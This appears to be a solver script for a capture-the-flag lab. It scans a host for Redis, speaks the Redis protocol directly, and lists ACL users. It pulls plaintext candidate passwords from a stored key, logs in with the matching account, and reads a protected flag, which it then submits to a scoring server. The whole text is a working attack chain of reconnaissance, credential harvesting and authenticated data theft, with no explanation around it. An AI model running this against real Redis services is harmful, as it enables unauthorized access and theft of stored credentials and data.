#!/bin/sh
set -eu

CHALLENGE_ID='scl-challenge-frame-cd1d95'
HOST='172.20.0.141'

nmap -n -Pn -p 6379 --open "$HOST" | grep -q '6379/tcp open'

python3 - "$HOST" <<'PY' > /tmp/scl-candidate
import json
import socket
import sys

host = sys.argv[1]

def command(*parts):
    chunks = [f"*{len(parts)}\r\n".encode()]
    for part in parts:
        data = str(part).encode()
        chunks += [f"${len(data)}\r\n".encode(), data, b"\r\n"]
    return b"".join(chunks)

def read_resp(sock):
    lead = sock.recv(1)
    if not lead:
        raise RuntimeError("Redis disconnected")
    line = bytearray()
    while not line.endswith(b"\r\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("Redis disconnected")
        line.extend(chunk)
    value = bytes(line[:-2])
    if lead == b"+":
        return value.decode()
    if lead == b"-":
        raise RuntimeError(value.decode())
    if lead == b":":
        return int(value)
    if lead == b"$":
        size = int(value)
        if size < 0:
            return None
        data = bytearray()
        while len(data) < size + 2:
            data.extend(sock.recv(size + 2 - len(data)))
        return bytes(data[:size])
    if lead == b"*":
        count = int(value)
        if count < 0:
            return None
        return [read_resp(sock) for _ in range(count)]
    raise RuntimeError("Unexpected response")

def send(sock, *parts):
    sock.sendall(command(*parts))
    return read_resp(sock)

with socket.create_connection((host, 6379), timeout=5) as sock:
    users = send(sock, "ACL", "USERS")
    candidates_raw = send(sock, "GET", "vault:candidates")
    if isinstance(users, dict) or not isinstance(candidates_raw, bytes):
        raise SystemExit("Could not read service evidence")
    candidates = json.loads(candidates_raw.decode("utf-8"))
    # RESP bulk strings are bytes, while candidate usernames are JSON strings.
    known_users = {user.decode("utf-8") if isinstance(user, bytes) else user for user in users}
    chosen = [record for record in candidates if record["username"] in known_users]
    if len(chosen) != 1:
        raise SystemExit("Could not isolate one matching account")
    account = chosen[0]
    auth = send(sock, "AUTH", account["username"], account["password"])
    if isinstance(auth, dict):
        raise SystemExit("Authentication failed")
    flag = send(sock, "GET", "vault:flag")
    if not isinstance(flag, bytes):
        raise SystemExit("Protected record was not returned")
    print(flag.decode("utf-8"))
PY

FLAG_VALUE=$(cat /tmp/scl-candidate)
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":sys.argv[1],"task_id":"task1","flag":sys.argv[2]}))' "$CHALLENGE_ID" "$FLAG_VALUE")"
